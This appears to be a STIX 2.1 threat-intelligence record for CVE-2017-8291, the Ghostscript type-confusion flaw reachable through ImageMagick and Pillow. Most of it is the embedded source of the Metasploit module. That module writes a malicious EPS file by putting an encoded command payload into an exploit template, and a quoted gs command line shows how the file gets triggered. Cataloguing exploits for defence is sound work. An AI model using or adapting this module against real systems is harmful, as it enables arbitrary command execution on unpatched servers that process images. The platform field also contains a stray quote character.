{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d462aa3-f91b-4e08-b324-2d12e0aa0560",
    "created": "2024-08-14T17:14:07.153496Z",
    "modified": "2024-08-14T17:14:07.1535Z",
    "name": "Ghostscript Type Confusion Arbitrary Command Execution",
    "description": " This module exploits a type confusion vulnerability in Ghostscript that can be exploited to obtain arbitrary command execution. This vulnerability affects Ghostscript versions 9.21 and earlier and can be exploited through libraries such as ImageMagick and Pillow. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/fileformat/ghostscript_type_confusion.rb",
            "external_id": "ghostscript_type_confusion.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'             => 'Ghostscript Type Confusion Arbitrary Command Execution',\n      'Description'      => %q{\n        This module exploits a type confusion vulnerability in Ghostscript that can\n        be exploited to obtain arbitrary command execution. This vulnerability affects\n        Ghostscript versions 9.21 and earlier and can be exploited through libraries\n        such as ImageMagick and Pillow.\n      },\n      'Author'           => [\n        'Atlassian Security Team', # Vulnerability discovery\n        'hdm'                      # Metasploit module\n      ],\n      'References'       => [\n        %w{CVE 2017-8291},\n        %w{URL https://bugs.ghostscript.com/show_bug.cgi?id=697808},\n        %w{URL https://seclists.org/oss-sec/2017/q2/148},\n        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=04b37bbce174eed24edec7ad5b920eb93db4d47d},\n        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=4f83478c88c2e05d6e8d79ca4557eb039354d2f3}\n      ],\n      'DisclosureDate'   => '2017-04-27',\n      'License'          => MSF_LICENSE,\n      'Platform'         => 'unix',\n      'Arch'             => ARCH_CMD,\n      'Privileged'       => false,\n      'Payload'          => {\n        'BadChars'       => \"\\x22\\x27\\x5c)(\" # \", ', \\, (, and )\n      },\n      'Targets'          => [\n        ['EPS file',  template: 'msf.eps']\n      ],\n      'DefaultTarget'    => 0,\n      'Notes'            => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA'            => ['ghostbutt'],\n        'RelatedModules' => [\n          'exploit/multi/fileformat/ghostscript_failed_restore',\n          'exploit/unix/fileformat/imagemagick_delegate'\n        ]\n      }\n    ))\n\n    register_options([\n      OptString.new('FILENAME', [true, 'Output file', 'msf.eps'])\n    ])\n  end\n\n  # Example usage from the bug tracker:\n  # $ gs -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f exploit2.eps\n\n  def exploit\n    file_create(template.sub('echo vulnerable > /dev/tty', payload.encoded))\n  end\n\n  def template\n    ::File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2017-8291',\n      target[:template]\n    ))\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-27",
    "x_mitre_platforms": [
        "unix'"
    ]
}